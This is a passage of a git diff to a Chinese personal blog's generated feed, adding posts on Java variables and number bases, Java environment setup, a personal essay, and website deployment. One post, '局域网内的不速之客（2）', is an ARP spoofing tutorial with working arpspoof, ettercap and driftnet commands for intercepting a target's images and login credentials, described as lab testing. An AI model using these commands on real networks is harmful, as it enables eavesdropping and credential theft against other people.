@@ -4,9 +4,117 @@
   
     
     <entry>
+      <title>Java变量与二进制</title>
+      <link href="/2019/07/16/java/java2/"/>
+      <url>/2019/07/16/java/java2/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1-变量"><a href="#1-变量" class="headerlink" title="1.变量"></a>1.变量</h3><p>一、    变量<br>变量相当于自然语言中的代词。比如：“您好”中的您。</p><h3 id="a-变量的分类"><a href="#a-变量的分类" class="headerlink" title="a)    变量的分类"></a>a)    变量的分类</h3><ol><li>成员变量(实例变量、全局变量)-写在类中的</li><li>局部变量(写在方法中的)—随时回收—GC—System.GC</li><li>常量 —不可变<h4 id="b-变量有哪些规则"><a href="#b-变量有哪些规则" class="headerlink" title="b)    变量有哪些规则"></a>b)    变量有哪些规则</h4>Java是强类型语言，在使用变量时，有既定的规则：</li><li>变量必须声明，并初始化以后才能使用</li><li>变量必须有明确的类型</li><li>变量不能重复定义(在相同代码域中)</li><li>变量有作用域<h3 id="二、-进制"><a href="#二、-进制" class="headerlink" title="二、    进制"></a>二、    进制</h3>1.10进制<br>十进制(逢10进1)<br>23678(10进制)=2 <em> 10000 + 3</em> 1000 + 6<em>100 + 7</em> 10 + 8*1<pre><code>            =2*10^4 + 3*10^3+ 6*10^2 + 7*10^1 + 8*10^0            =23678</code></pre></li></ol><h3 id="2-二进制"><a href="#2-二进制" class="headerlink" title="2.二进制"></a>2.二进制</h3><p>   逢2进1 基数是2的进制。<br>权：128 64 32 16 8 4 2 1<br>   15 =  0000 1111<br>   0100 0001(2进制) = 65</p><h3 id="4-补码"><a href="#4-补码" class="headerlink" title="4.    补码"></a>4.    补码</h3><p>1000  -8<br>1001  -7<br>1010  -6<br>1011  -5<br>1100  -4<br>1101   -3<br>1110   -2<br>1111   -1<br>0000   0<br>0001   1<br>0010   2<br>0011   3<br>0100   4<br>0101   5<br>0110  6<br>0111   7<br>在二进制中，符号位(最高位)为0的是正数，为1的是负数.</p><p>-1 + 1 = 0<br>1111 + 0001 = 0<br>        1111</p><pre><code>+        0001    0000</code></pre><p> 在封闭的四位运算中，(超出4位就丢弃)</p><p>1101   -3  ~0010 + 1<br>0011  3      0011<br>计算机中正数和负数的关系是取反加一。举例：~3 + 1 = -3（表示对3取反）<br>补码运算是封闭的，运算结果保留在补码范围内，超出范围就溢出。<br>补码有边界溢出风险。<br>4位二进制补码最多能表示2^4（16）个数，数的范围是-8 7</p><h3 id="16进制："><a href="#16进制：" class="headerlink" title="16进制："></a>16进制：</h3><p>0 – f<br>十六进制中的一个数代表了二进制中4位<br>1234567890<br>二进制：01001001100101100000001011010010<br>十六进制：499602d2</p><p>192</p><p>256 – 192  64<br>二进制：0000000011000000<br>十六进制：00c0</p><p>0xf4;(十六进制的书写形式)<br>二进制：1111 0100<br>十进制：128 + 64 + 32 + 16 + 4 = 244</p><h3 id="三、-Java的数据类型"><a href="#三、-Java的数据类型" class="headerlink" title="三、    Java的数据类型"></a>三、    Java的数据类型</h3><p>Java中的数据类型，分为引用类型和基本数据类型，基本类型有8种。<br>基本数据类型<br>整形：byte short int long<br>浮点型 float double<br>字符型char<br>布尔型boolean</p><h3 id="a-整数类型"><a href="#a-整数类型" class="headerlink" title="a)    整数类型"></a>a)    整数类型</h3><p>byte  8位  0x7f   0x80<br>short  16位   0x7fff  0x8000<br>int 32位    0x7fffffff 0x80000000<br>long 64  …   …</p><h3 id="b-浮点数类型"><a href="#b-浮点数类型" class="headerlink" title="b)    浮点数类型"></a>b)    浮点数类型</h3><p>float 32位 float的精度是23位(即能精确表达23位的数，超过就被截取)<br>不精确，很少被使用。<br>用小数表示的数据类型</p><p>double 类型能表示64位<br>double精确度比int精确，但是不如long<br>需要注意的是：浮点数的字面量默认就是double</p><h3 id="c-字符类型"><a href="#c-字符类型" class="headerlink" title="c)    字符类型"></a>c)    字符类型</h3><p>char 经常用到的，必须掌握，字符类型是一个16位无符号位的整数。<br>这个数是一个字符的unicode编码值。<br>Unicode编码值 是全球范围内的编码方法，编制了英文，中，日，韩，阿拉伯，希伯来等等共65535个字符.<br>Java中的char 的范围是0-65535<br>Unicode编码中英文部分与Ascii码兼容(ASCII表示0-128)<br>编码是什么？在计算机中不能写字，只能有0和1表示的数。<br>人为规定某个数除了表示一个数还可以表示一个字符。<br>一个10进制的65 代表的字符就是大写的A。</p><h3 id="d-布尔类型"><a href="#d-布尔类型" class="headerlink" title="d)    布尔类型"></a>d)    布尔类型</h3><p>布尔类型：boolean 表示真(true)假(false)</p><h3 id="四、-数据类型的转换"><a href="#四、-数据类型的转换" class="headerlink" title="四、    数据类型的转换"></a>四、    数据类型的转换</h3><p>自动类型转换<br>小类型到大类型的转换称为自动类型转换，是自动完成的。也叫隐式类型转换。<br>一般不需要处理，规则是：符号位会自动扩展，负数补1，正数不0.保证补码数值不变。</p><p>强制类型转换<br>这种转换有风险，会溢出，或者损失精度。要注意数据范围。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 赵子龙 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Java </tag>
+            
+            <tag> 变量 进制 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>局域网内的不速之客（2）</title>
+      <link href="/2019/07/15/attark/arp2/"/>
+      <url>/2019/07/15/attark/arp2/</url>
+      
+        <content type="html"><![CDATA[<p>如果arp攻击是断网，那么arp欺骗就是对数据流量的截获，其实原理很简单，就是以kali系统为目标主机向路由器说我就是你要发送信号的主机，这样kali在开启ip地址转发的情况下，上网所经的数据流量经过kali主机，kali就能对其进行图片，账号密码的截获，当然并不是能百分之百截获到，只能获取到一部分，但这样已经会造成很大的安全问题！</p><h3 id="cat-proc-sys-net-ipv4-ip-forward"><a href="#cat-proc-sys-net-ipv4-ip-forward" class="headerlink" title="cat /proc/sys/net/ipv4/ip_forward"></a>cat /proc/sys/net/ipv4/ip_forward</h3><p>   //查看kali系统是否开启了ip地址转发（其中0表示没有开起1表示开启）</p><h3 id="echo-1-gt-proc-sys-net-ipv4-ip-forward"><a href="#echo-1-gt-proc-sys-net-ipv4-ip-forward" class="headerlink" title="echo 1 &gt;/proc/sys/net/ipv4/ip_forward"></a>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</h3><p>  // 临时修改kali系统开启ip地址转发（开启IP地址转发，目标主机依然可以上网，但网络质量可能会很差）</p><h4 id="如何使kali系统永久开启ip地址转发？"><a href="#如何使kali系统永久开启ip地址转发？" class="headerlink" title="//如何使kali系统永久开启ip地址转发？"></a>//如何使kali系统永久开启ip地址转发？</h4><p>输入命令：vim /etc/sysctl.conf<br>找到对应的命令行，net ipv4.ip forward=1;将警号去掉即可永久生效，或者复制命令行在命令下，带警号这样就起到了注释的作用<br>这时候kali系统就相当于一个路由器，可以实现ip地址的转发<br>输入命令</p><h4 id="arpspoof-i-eth0-t-192-168-43-129-192-168-43-5"><a href="#arpspoof-i-eth0-t-192-168-43-129-192-168-43-5" class="headerlink" title="arpspoof -i eth0 -t 192.168.43.129 192.168.43.5"></a>arpspoof -i eth0 -t 192.168.43.129 192.168.43.5</h4><p>另外在开启一个终端窗口</p><h4 id="driftnet-i-eth0"><a href="#driftnet-i-eth0" class="headerlink" title="driftnet -i eth0"></a>driftnet -i eth0</h4><h4 id="抓到本地：driftnet-i-eth0-d-home-路径"><a href="#抓到本地：driftnet-i-eth0-d-home-路径" class="headerlink" title="抓到本地：driftnet -i eth0 -d /home/**(路径)"></a>抓到本地：driftnet -i eth0 -d /home/<em>**</em>(路径)</h4><h3 id="2-图形化工具"><a href="#2-图形化工具" class="headerlink" title="2.图形化工具"></a>2.图形化工具</h3><h4 id="ettercap-–-help-查看参数"><a href="#ettercap-–-help-查看参数" class="headerlink" title="ettercap – help 查看参数"></a>ettercap – help 查看参数</h4><h4 id="ettercap-G-进入图形化管理界面，扫描端口下存活主机，将网关IP地址加到atark1目标主机添加到atark2选择Mitm-gt-ArP毒化"><a href="#ettercap-G-进入图形化管理界面，扫描端口下存活主机，将网关IP地址加到atark1目标主机添加到atark2选择Mitm-gt-ArP毒化" class="headerlink" title="ettercap - G //进入图形化管理界面，扫描端口下存活主机，将网关IP地址加到atark1目标主机添加到atark2选择Mitm-&gt;ArP毒化"></a>ettercap - G //进入图形化管理界面，扫描端口下存活主机，将网关IP地址加到atark1目标主机添加到atark2选择Mitm-&gt;ArP毒化</h4><h4 id="ettercap-i-eth0-Tq-M-arp-remote-192-168-43-129-192-168-43-144"><a href="#ettercap-i-eth0-Tq-M-arp-remote-192-168-43-129-192-168-43-144" class="headerlink" title="ettercap -i eth0 -Tq -M arp:remote //192.168.43.129// //192.168.43.144//"></a>ettercap -i eth0 -Tq -M arp:remote //192.168.43.129// //192.168.43.144//</h4><p>其中 tq是静态文本，M为中间人攻击，格式严谨<br>开启攻击—底部出现help，那么一般情况下就是启动成功了<br>这时候再使用driftnet -i eth0<br>对图片进行截获，不知道为啥但是感觉图形化工具比较好用，截获图片数量也比较多</p><h3 id="3-获取用户登陆密码及账号"><a href="#3-获取用户登陆密码及账号" class="headerlink" title="3.获取用户登陆密码及账号"></a>3.获取用户登陆密码及账号</h3><p>我做了靶机测试，发现并不是所有账号密码都可以截获现在很多网站采用https传输协议，即使截到了也不一定是明文，通常是通过某些特殊算法进行加密<br>so，懂我意思吧！</p><h3 id="步骤，开启两个终端，输入命令"><a href="#步骤，开启两个终端，输入命令" class="headerlink" title="步骤，开启两个终端，输入命令"></a>步骤，开启两个终端，输入命令</h3><h4 id="1-echo-1-gt-proc-sys-net-ipv4-ip-forward（终端1）"><a href="#1-echo-1-gt-proc-sys-net-ipv4-ip-forward（终端1）" class="headerlink" title="1.echo 1 &gt;/proc/sys/net/ipv4/ip_forward（终端1）"></a>1.echo 1 &gt;/proc/sys/net/ipv4/ip_forward（终端1）</h4><h4 id="2-arpspoof-i-eth0-t-192-168-43-129-192-168-43-5（终端1，前一个ip地址是目标ip，后一个主机地址是网关，这个语法通俗点讲就是告诉路由器我是你要发送信息的目标）"><a href="#2-arpspoof-i-eth0-t-192-168-43-129-192-168-43-5（终端1，前一个ip地址是目标ip，后一个主机地址是网关，这个语法通俗点讲就是告诉路由器我是你要发送信息的目标）" class="headerlink" title="2.arpspoof -i eth0 -t 192.168.43.129 192.168.43.5（终端1，前一个ip地址是目标ip，后一个主机地址是网关，这个语法通俗点讲就是告诉路由器我是你要发送信息的目标）"></a>2.arpspoof -i eth0 -t 192.168.43.129 192.168.43.5（终端1，前一个ip地址是目标ip，后一个主机地址是网关，这个语法通俗点讲就是告诉路由器我是你要发送信息的目标）</h4><h4 id="3-ettercap-Tq-i-eth0（终端2，开启静态文本监听模式）"><a href="#3-ettercap-Tq-i-eth0（终端2，开启静态文本监听模式）" class="headerlink" title="3.ettercap -Tq -i eth0（终端2，开启静态文本监听模式）"></a>3.ettercap -Tq -i eth0（终端2，开启静态文本监听模式）</h4><p>基本上输入号这三个命令就完成了对目标主机账号密码的监听，随着时代进步，手工输入密码的形式渐渐被扫描二维码登陆所代替。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 赵子龙 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 转发 </tag>
+            
+            <tag> 截获 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Java环境变量</title>
+      <link href="/2019/07/11/java/java/"/>
+      <url>/2019/07/11/java/java/</url>
+      
+        <content type="html"><![CDATA[<h2 id="如何配置Java环境变量"><a href="#如何配置Java环境变量" class="headerlink" title="如何配置Java环境变量"></a>如何配置Java环境变量</h2><h3 id="1-下载1-8版本的JDK-傻瓜式安装，（一路默认选择）"><a href="#1-下载1-8版本的JDK-傻瓜式安装，（一路默认选择）" class="headerlink" title="1.    下载1.8版本的JDK -傻瓜式安装，（一路默认选择）"></a>1.    下载1.8版本的JDK -傻瓜式安装，（一路默认选择）</h3><h3 id="2-Java环境变量配置："><a href="#2-Java环境变量配置：" class="headerlink" title="2.    Java环境变量配置："></a>2.    Java环境变量配置：</h3><p>a)    JAVA_HOME</p><h5 id="i-首先右击-计算机-进入-属性-然后选择其中的-高级系统设置"><a href="#i-首先右击-计算机-进入-属性-然后选择其中的-高级系统设置" class="headerlink" title="i.    首先右击[计算机]进入[属性]然后选择其中的[高级系统设置]"></a>i.    首先右击[计算机]进入[属性]然后选择其中的[高级系统设置]</h5><p>点击进入[高级]中的[环境变量]，进入环境变量编辑界面。<br>变量名：JAVA_HOME<br>变量值：实际的安装路径（jdk所在的路径，通常默认在c盘programfile—&gt;java文件内）</p><h5 id="b-Path变量的设置"><a href="#b-Path变量的设置" class="headerlink" title="b)    Path变量的设置"></a>b)    Path变量的设置</h5><p>i.    同样是在[系统变量中]，我们可以看到path变量已经存在，那么我们只需要点击编辑即可。  </p><h5 id="变量值：-JAVA-HOME-bin-JAVA-HOME-jre-bin"><a href="#变量值：-JAVA-HOME-bin-JAVA-HOME-jre-bin" class="headerlink" title="变量值：%JAVA_HOME%\bin; %JAVA_HOME%\jre\bin;"></a>变量值：%JAVA_HOME%\bin; %JAVA_HOME%\jre\bin;</h5><h5 id="bug："><a href="#bug：" class="headerlink" title="bug："></a>bug：</h5><p>我在配置path环境变量的时候发生了一个小问题，按%Java_HOME%,这个是相对路径，但是在dos界面Javac却找不到命令，于是我将path变量新增了jre和jdk/bin目录（绝对路径）后这个问题得到了解决</p><h4 id="c-Classpath"><a href="#c-Classpath" class="headerlink" title="c)    Classpath:"></a>c)    Classpath:</h4><h5 id="变量值：-java-home-lib-java-home-lib-tools-jar"><a href="#变量值：-java-home-lib-java-home-lib-tools-jar" class="headerlink" title="变量值：.;%java_home%\lib;%java_home%\lib\tools.jar;"></a>变量值：.;%java_home%\lib;%java_home%\lib\tools.jar;</h5><h3 id="二、-Java环境变量配置详解"><a href="#二、-Java环境变量配置详解" class="headerlink" title="二、    Java环境变量配置详解"></a>二、    Java环境变量配置详解</h3><h4 id="1-JAVA-HOME"><a href="#1-JAVA-HOME" class="headerlink" title="1.    JAVA_HOME"></a>1.    JAVA_HOME</h4><p>为了方便引用，例如你jdk安装在C：/xxx/xx/xx目录里，则设置JAVA_HOME为该目录的引用。那么以后你要使用这个路径的时候，只需要输入%JAVA_HOME%即可。</p><h4 id="2-path"><a href="#2-path" class="headerlink" title="2.    path"></a>2.    path</h4><p>你想在任何时候都使用%JAVA_HOME%\bin\java命令来执行可行性文件吗？显然不会。于是你可以选择把%JAVA_HOME%\bin\java添加到PATH路径下。这样我们就可以在任何路径下只用java执行命令.</p><h4 id="3-classpath"><a href="#3-classpath" class="headerlink" title="3.    classpath"></a>3.    classpath</h4><p>为了程序能够找到相应的.class文件。举个例子：编译一个JAVA程序A.java<br>会得到一个A.class的类文件。在当前目录下执行java A 将会得到相应的结果<br>(前提是已经设置CLASSPATH为”.”)现在，把A.class移到别的目录下，在执行<br>Java A 将会抛出java.lang.NoClassDelFoundError异常。因为找不到.class文件。<br>现在你把CLASSPATH增加为你转移的目录在运行，结果才会正常。<br>总之一句话去高阔classpath：加载被编译过的.java文件，使之可以找到对应的.class文件。  </p><h5 id="总结：一共需要配置三个环境变量，每个环境变量所对应的执行条件不同，环境变量的配置意味着操作系统能否找到并成功执行java文件"><a href="#总结：一共需要配置三个环境变量，每个环境变量所对应的执行条件不同，环境变量的配置意味着操作系统能否找到并成功执行java文件" class="headerlink" title="总结：一共需要配置三个环境变量，每个环境变量所对应的执行条件不同，环境变量的配置意味着操作系统能否找到并成功执行java文件"></a>总结：一共需要配置三个环境变量，每个环境变量所对应的执行条件不同，环境变量的配置意味着操作系统能否找到并成功执行java文件</h5><h5 id="知识拓展"><a href="#知识拓展" class="headerlink" title="知识拓展"></a>知识拓展</h5><p>JDK :就是Java开发工具包<br>JRE：就是Java运行时环境<br>JVM：Java虚拟机<br>Java Se API：就是Java系统核心类库<br>JDK包含了JRE</p><p>JavaSe:基础<br>JavaEE：web企业级应用开发<br>JavaMe：Android</p><h4 id="问题：-jar包是什么？封装好的jar包是否能得到源码？"><a href="#问题：-jar包是什么？封装好的jar包是否能得到源码？" class="headerlink" title="问题： jar包是什么？封装好的jar包是否能得到源码？"></a>问题： jar包是什么？封装好的jar包是否能得到源码？</h4><h4 id="答：jar包实际上是一个压缩文件，类似-rar，jar包通常叫第三方库，框架，其实就是别人写好的工具类，通过反编译就能得到源码。"><a href="#答：jar包实际上是一个压缩文件，类似-rar，jar包通常叫第三方库，框架，其实就是别人写好的工具类，通过反编译就能得到源码。" class="headerlink" title="答：jar包实际上是一个压缩文件，类似.rar，jar包通常叫第三方库，框架，其实就是别人写好的工具类，通过反编译就能得到源码。"></a>答：jar包实际上是一个压缩文件，类似.rar，jar包通常叫第三方库，框架，其实就是别人写好的工具类，通过反编译就能得到源码。</h4>]]></content>
+      
+      
+      <categories>
+          
+          <category> 赵子龙 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Java </tag>
+            
+            <tag> 环境 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>闲散</title>
+      <link href="/2019/07/08/composition/"/>
+      <url>/2019/07/08/composition/</url>
+      
+        <content type="html"><![CDATA[<p>我也是无语啦，写了三千字，没保存，so 使用markdown一定要选启用自动保存啊！！！<br>没啥好命名的题目，随便开始写吧！<br>在我过去一年的大学生涯里，我深刻的体会到了当代大学生的迷惘和困惑。一进学校就开始焦虑自己的未来，非常功利的规划自己每一步，我要怎么怎么样，但现实是残酷的，其实我高中时并不是这样的人，那时我行我素，固步自封，用俗话讲就是头铁吧！下面讲个故事吧，所谓事情的发展总是两面性的，物极必反，在那样“头铁”的性子下，我离家出走了，我一直认为一个人也可以生活的很好，然而…还是那句话，现实是残酷的，很快我身上带的钱所剩无几，这意味着我不赚钱将会面临挨饿，那是我第一次感受到危机感，迫于生活，我找到了一家中介公司，中介以强硬的态度让我签下很多份含有不平等条约的合同，当时，我还有些高兴，我找到工作了，但这只是故事的开始。<br>我如期的进到了一家洗衣液外包工厂，老油条们都喜欢欺负新人，什么重活脏活都给我，车间头儿也是有点小权时时刻刻发挥到极致，我任劳任怨的虚度着光阴，我其实是一个利他主义者，或许这种行为的本质就是内心善良吧，然而这种善良并不会被人们珍惜，反而会被肆意践踏。直到有一天我被调到厂里流水线作业量最大的生产线上，我因为跟不上巨大的工作量，boss直接要开除我，并扬言不会给一分钱工钱。<br>从小就听老师讲，有问题找警察，嗯，于是我就报警啦，然而警察告诉我，这方面事情，他们管不了，这种事要去劳动局，申诉，劳动仲裁，法院起诉，一系列流程，我深刻的意识到这个时间我是耗不起的，当时啊真的是穷困潦倒，风餐露宿。不知道你们报没报过警，他们如果出动了警力，需要对报警人信息做一个备案，就这样我还被带去派出所一趟。没办法我还是去了劳动局，我等了很久排上号，那个服务区的人就给我一种有理也没地方说的感觉吧！最后那人讲了一句，小兄弟回家吧！别出来打工了，他就喊了下一号，顿时什么贪污受贿，狼狈为奸，官官相护出现在我的脑海，我不甘，在那等了一夜，第二天他一上班我又来了，我如愿的要到了一张申诉表，最后经过“他们”之间的协商，给了我三百块钱，我记得当时干了十天，一天十二小时吧，十天我就被开除了，因为啥啊，就因为我是临时的呗，这是资本主义管用的手法，杀一儆百。嗯，当时就一个想法，以后不想再那么累，我又想到父亲说的一些话，韵味深长。所以呢我写这个故事希望能前车之鉴，让你有些感悟少走些弯路。  </p><p>#####努力不一定成功，也不一定就有什么结果，但你努力过就会有收获（经历）。  </p><p>身边的很多人，焦虑为什么别人目标那么明确，自己却没有那么清晰。出于某种补偿心理，他们会一方面参加各种各样的社团活动，社会实践，另一-方面门门考试逼着自己拿A。其实在这种全方面恶性竞争的生态下，只会造就两种人，全面彻底的输家，和全面彻底的但是却是insecured overacheivers的赢家。都说大学教育正在堕落成为失去灵魂的卓越，当然这不是大学问题，而是后现代性的社会出现的必然问题，在此不表，有空另开小灶。但是在我看来，更可忧虑的是那些赢家并不因此成就”卓越”，反倒可能因为熟谙了各种潜规则而变成蝇营狗苟的现实主义者，与此相对，输家则因为遭遇挫或不公而成为愤世嫉俗者和犬儒主义者。无论是哪一种结果，都以丧失灵魂为代价。所以这就是为什么部分大学生涯里我在我的四周自己给自己修起了一座高墙，自己不想出去，也不准别人走进的原因:当谈论的只是各种八卦新闻、网络游戏或说纯粹的男欢女爱，这样的大学一定不可能是卓越的，因为它背离了大学的本义。<br>或许长此以往，我也会变成那种我曾经讨厌的人，此时我想起一首歌<br>有人浪迹江湖，有人寒窗苦读</p><p>有人阿谀奉承，有人早已麻木</p><p>有人嫌贫爱富，有人唯利是图</p><p>有人精打细算，有人满不在乎  </p><p>为此我经常体会到了自己的矛盾，我，你，都是社会性体会。要在社会里走下去，必须要玩社会本身的游戏规则，尤其潜规则玩好比实打实的规则更重要。至于如何调整、引导这个矛盾，是我一直在学习的一件事情。我目前的方法是:是专注。走不出去，，那就专注的做好每件事情吧，那就把它做到极致吧。每个人都在寻找那个可以用尽全身气力去拥抱的对象，并且希望这个拥抱可以让自己变得安全、强大甚至完满。但随着年复一年的变更，我越来越认同昂山素季的这个说法“真正的改变是通过理解、同情、正义、爱心后的内在变化。”只有经历了如此这般的内在变化，你才会和自己停战，才能够学会不自负、不迟疑、也不骄慢”地与世界媾和。小至个体，大到国家，概莫能外。  </p><p>我总是亦步亦趋，因为我害怕失败，其实不过是自尊心作祟，我已经是个彻彻底底的loser，我还有什么释怀不了呢，其实最大的敌人莫过于自己，加油！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 赵子龙 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 经历 </tag>
+            
+            <tag> 感悟 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>网站开发概述（2）</title>
-      <link href="/2019/06/27/web2/"/>
-      <url>/2019/06/27/web2/</url>
+      <link href="/2019/06/27/web/web2/"/>
+      <url>/2019/06/27/web/web2/</url>
       
         <content type="html"><![CDATA[<h3 id="材料准备："><a href="#材料准备：" class="headerlink" title="材料准备："></a>材料准备：</h3><p>1.云服务器–以我的服务器为例子<br><img src="http://ptr2cwxdn.bkt.clouddn.com/2019-06-27_172422.png" alt><br>2.tomcat服务器（这时候可能有些人会懵，这两个服务器有啥区别，云服务器呢就是放tomcat的服务器，而tomcat服务器是存放你项目的服务器，它们是一种从属，包含关系）这里附上tomcat的下载连接(自带jdk-我都叫它解压版的tomcat)<br><a href="https://share.weiyun.com/57Wjpp2" target="_blank" rel="noopener">tomcat</a><br>3.你的项目</p><h3 id="远程连接："><a href="#远程连接：" class="headerlink" title="远程连接："></a>远程连接：</h3><p>第一步，首先要对你的云服务器进行环境部署，那么这极为重要的一步就是要通过远程桌面连接上服务器<br>1.右键点击开始点击运行（快捷键win+R）在命令行内输入mstsc<br><img src="http://ptr2cwxdn.bkt.clouddn.com/2019-06-27_172423.png" alt><br>2.输入本机计算机用户名（administrator），和需要连接的服务器公网ip地址<br><img src="http://ptr2cwxdn.bkt.clouddn.com/2019-06-27_172424.png" alt><br>3.输入服务器的密码<br><img src="http://ptr2cwxdn.bkt.clouddn.com/2019-06-27_172425.png" alt><br>4.连接成功<br><img src="http://ptr2cwxdn.bkt.clouddn.com/2019-06-27_214328.png" alt></p><h3 id="项目部署"><a href="#项目部署" class="headerlink" title="项目部署"></a>项目部署</h3><p>将下载好的 websever（tomcat）打包复制粘贴到服务器上<br>解压后把项目放到下图路径内<br><img src="http://ptr2cwxdn.bkt.clouddn.com/2019-06-27_214613.png" alt><br><img src="http://ptr2cwxdn.bkt.clouddn.com/2019-06-27_214831.png" alt><br>启动tomcat服务器<br><img src="http://ptr2cwxdn.bkt.clouddn.com/2019-06-27_215101.png" alt><br>出现如上图字样服务器运行成功，此时dos界面不可以关闭，在浏览器内输入公网的IP地址就你能访问的网站<br>以我的项目演示<br><img src="http://ptr2cwxdn.bkt.clouddn.com/2019-06-27_215356.png" alt><br>此时静态网站发布完成！</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>一、本机测试<br>在HBuilder里测试<br>在WebServer里测试<br>二、部署到公网服务器<br>申请一台公网服务器 ( 阿里云/腾讯云/百度云)<br>远程登录上去，把WebServer.zip拷上去<br>把网站项目文件拷贝到 webapps\ROOT\下<br>启动服务</p><h5 id="后续loading"><a href="#后续loading" class="headerlink" title="后续loading"></a>后续loading</h5><p>动态网站开发概述与项目发布</p>]]></content>
       
@@ -32,8 +140,8 @@
     
     <entry>
       <title>网站开发概述（1）</title>
-      <link href="/2019/06/26/web1/"/>
-      <url>/2019/06/26/web1/</url>
+      <link href="/2019/06/26/web/web1/"/>
+      <url>/2019/06/26/web/web1/</url>
       
         <content type="html"><![CDATA[<h5 id="你是否也想拥有一个自己的网站呢？"><a href="#你是否也想拥有一个自己的网站呢？" class="headerlink" title="你是否也想拥有一个自己的网站呢？"></a>你是否也想拥有一个自己的网站呢？</h5><p>接下来的网站系列我会概述，制作一个静态网站所需要的东西，以及将制作好的项目发布到服务器上的教程。</p><p>####### 网站类型：网站呢！它分为静态网站和动态网站，所谓静态网站就是没有后台的，作为静态展示用的网站<br>动态的，大家一般就理解成有后台支持的，可以通过后台修改网页内容的网站那种（这里的后台指后台管理操作，有数据库支持，能对网站做出更新的功能）</p><h5 id="1-开发软件的安装-HBuilder（这款编译器有很强的代码索引功能，写起代码非常轻松）"><a href="#1-开发软件的安装-HBuilder（这款编译器有很强的代码索引功能，写起代码非常轻松）" class="headerlink" title="1.开发软件的安装 HBuilder（这款编译器有很强的代码索引功能，写起代码非常轻松）"></a>1.开发软件的安装 HBuilder（这款编译器有很强的代码索引功能，写起代码非常轻松）</h5><p>这里附上HBuilder的安装包地址—<a href="https://share.weiyun.com/5AOIOrI" target="_blank" rel="noopener">腾讯微云</a>—<br>安装好了之后你就可以开始开发一个静态网站了！一个静态网站基本需要会html的标签语法加上css布局和一定的js水平<br>如果是小白的话不用担心，可以自学，这里跟一些比较好的自学网站地址<br><a href="https://www.runoob.com/" target="_blank" rel="noopener">菜鸟教程</a>  <a href="http://www.w3school.com.cn/" target="_blank" rel="noopener">W3school</a></p><h5 id="2-网站发布概述"><a href="#2-网站发布概述" class="headerlink" title="2.网站发布概述"></a>2.网站发布概述</h5><p>发布网站，想让全国各地的人访问到你的网站，就要把你制作好的网站发布到服务器上（服务器呢它虽然叫服务器，其实它就是一台不关机的电脑，不知道你是否了解远程连接，远程访问，可以这么理解服务器它就是任何用户都可以访问的一台电脑）<br>嗯！可能解释的有些抽象，但当你有了一台自己的服务器的时候，你会发现我说的非常通俗易懂！哈哈<br>这时候你会产生疑问，我的项目该放在服务器的哪个地方呢！这里就需要说到应用层服务器，阿帕奇的tomcat，这个东西它能自动解析你的项目，一主默认的主网页都是index.html，它解析过了之后呢，你运行它通常就是出来一个dos界面里面显示几月几月份<br>然后你通过你服务器公网的ip地址就能直接访问到你的网站了！</p><h5 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h5><p>当你手中有一个比较完善的项目的时候，这时候就需要将web项目进行部署<br>1.你需要一台服务器来运行你的项目，服务器哪里买呢，中国四大服务器运营商，什么阿里，腾讯，华为，百度，我是买的阿里的，阿里有个云翼计划（活动），对学生优惠9.5一个月服务器，很便宜，可以玩很久.<br>2.你需要一个域名来解析你的服务器公网ip地址，（这时候可能有人会疑问，什么是域名呢，域名它实际上是一个网址，一般都是万维网www开头的，通过这个域名就能访问你的网站内容，嗯，是不是很容易理解呢）<br>3.你需要将tomecat或其他..安装到服务器上，并配置jdk环境</p><h4 id="4-内网穿透（把自己电脑当成服务器）"><a href="#4-内网穿透（把自己电脑当成服务器）" class="headerlink" title="4.内网穿透（把自己电脑当成服务器）"></a>4.内网穿透（把自己电脑当成服务器）</h4><p>比如有些人不想买服务器，或者我没有钱买怎么办呢，在网站教程系列的末尾，<br>会出一篇关于使用《花生壳内网穿透的教程》，这个原理很容易明白就是把你的电脑ip地址映射到公网上，这样别人就能通过浏览器来访问你的网站，嗯，但是也有弊端，自己的电脑需要一直开着，并且会使它不安全，或者出现上行不够的情况</p>]]></content>
       
@@ -59,8 +167,8 @@
     
     <entry>
       <title>局域网内的不速之客（1）</title>
-      <link href="/2019/06/13/1/"/>
-      <url>/2019/06/13/1/</url>
+      <link href="/2019/06/13/attark/arp1/"/>
+      <url>/2019/06/13/attark/arp1/</url>
       
         <content type="html"><![CDATA[<p><img src="http://psu9uo26a.bkt.clouddn.com/2019-06-13_175422.png" alt="@子龙"><br>当你在虚拟机中安装好了kali系统的时候（如上图所示），kali系统包含众多脚本，可以帮助我们做很多测试，下面主要介绍Arp攻击的原理及教程</p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。</p><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。</p><h3 id="ARP攻击的局限性"><a href="#ARP攻击的局限性" class="headerlink" title="ARP攻击的局限性"></a>ARP攻击的局限性</h3><p>ARP攻击仅能在以太网（局域网如：机房、内网、公司网络等）进行。</p><p>无法对外网（互联网、非本区域内的局域网）进行攻击。</p><h3 id="ARP攻击的攻击原理"><a href="#ARP攻击的攻击原理" class="headerlink" 